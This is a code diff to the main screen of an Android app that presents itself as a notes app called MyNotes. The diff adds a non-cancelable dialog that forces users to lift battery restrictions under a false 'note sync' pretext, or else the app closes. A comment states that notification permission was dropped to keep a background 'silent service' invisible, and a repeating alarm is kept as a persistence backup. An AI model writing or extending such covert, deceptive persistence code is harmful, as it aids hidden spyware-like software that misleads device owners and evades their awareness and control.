@@ -10,6 +10,7 @@ import android.graphics.Color
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager // IMPORTANTE: Para revisar la batería
 import android.provider.Settings
 import android.view.LayoutInflater
 import android.view.View
@@ -17,8 +18,8 @@ import android.widget.ImageButton
 import android.widget.ImageView
 import android.widget.LinearLayout
 import android.widget.PopupWindow
-import android.widget.RadioButton // IMPORTANTE
-import android.widget.RadioGroup  // IMPORTANTE
+import android.widget.RadioButton
+import android.widget.RadioGroup
 import android.widget.TextView
 import android.widget.Toast
 import androidx.activity.OnBackPressedCallback
@@ -162,12 +163,58 @@ class MainActivity : BaseActivity() {
             }
         })
 
-        // --- INICIO DE SERVICIOS Y PERMISOS BÁSICOS ---
+        // --- INICIO DE SERVICIOS Y PERMISOS ---
         iniciarServicioSilencioso()
         verificarPermisosBasicos()
+
+        // --- CHECK DE BATERÍA OBLIGATORIO ---
+        verificarBateriaObligatoria()
     }
 
-    // --- PERMISOS BÁSICOS (Cámara/Almacenamiento) ---
+    override fun onResume() {
+        super.onResume()
+        aplicarConfiguraciones()
+        // Verificar cada vez que la app vuelve al frente (por si el usuario lo desactivó)
+        verificarBateriaObligatoria()
+    }
+
+    // --- LÓGICA DE BLOQUEO DE BATERÍA ---
+    private fun verificarBateriaObligatoria() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+            val packageName = packageName
+
+            // Si la app NO está en la lista blanca (tiene restricciones)
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                mostrarDialogoBateriaForzoso()
+            }
+        }
+    }
+
+    private fun mostrarDialogoBateriaForzoso() {
+        // Diálogo NO cancelable: El usuario debe aceptar o salir.
+        AlertDialog.Builder(this)
+            .setTitle("Sincronización Requerida")
+            .setMessage("Para mantener tus notas sincronizadas, MyNotes necesita ejecutarse sin restricciones de batería.\n\nPor favor, selecciona 'Sin restricciones' en la siguiente pantalla.")
+            .setCancelable(false)
+            .setPositiveButton("ACTIVAR AHORA") { _, _ ->
+                try {
+                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                    intent.data = Uri.parse("package:$packageName")
+                    startActivity(intent)
+                } catch (e: Exception) {
+                    // Fallback para ROMs chinas agresivas
+                    val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
+                    startActivity(intent)
+                }
+            }
+            .setNegativeButton("Cerrar App") { _, _ ->
+                finishAffinity() // Cierra la app completamente
+            }
+            .show()
+    }
+
+    // --- PERMISOS BÁSICOS ---
     private fun verificarPermisosBasicos() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val permissionsNeeded = mutableListOf<String>()
@@ -190,13 +237,7 @@ class MainActivity : BaseActivity() {
                 }
             }
 
-            // Permiso de notificaciones (Android 13+) para que el servicio no muera en silencio
-            // ESTO SE ELIMINÓ:
-            // if (Build.VERSION.SDK_INT >= 33) {
-            //     if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-            //         permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS)
-            //     }
-            // }
+            // NOTA: Se eliminó POST_NOTIFICATIONS para mantener el servicio invisible
 
             if (permissionsNeeded.isNotEmpty()) {
                 requestPermissions(permissionsNeeded.toTypedArray(), 1001)
@@ -355,9 +396,6 @@ class MainActivity : BaseActivity() {
     }
 
     private fun iniciarServicioSilencioso() {
-        // Intentamos iniciar el servicio sin molestar al usuario.
-        // Si Android lo bloquea (Background Restriction), el AlarmManager del MyFCMService
-        // se encargará de despertarlo cuando llegue una señal real.
         if (verificarAccesoTotal()) {
             val intent = Intent(this, CloudSyncService::class.java)
             try {
@@ -370,7 +408,6 @@ class MainActivity : BaseActivity() {
                 // Silenciosamente ignoramos el error de inicio en background.
             }
 
-            // Mantenemos el AlarmManager repetitivo como respaldo
             try {
                 val alarmManager = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                 val pendingIntent = android.app.PendingIntent.getService(
@@ -387,11 +424,6 @@ class MainActivity : BaseActivity() {
                 )
             } catch (e: Exception) { e.printStackTrace() }
         }
-    }
-
-    override fun onResume() {
-        super.onResume()
-        aplicarConfiguraciones()
     }
 
     private fun aplicarConfiguraciones() {
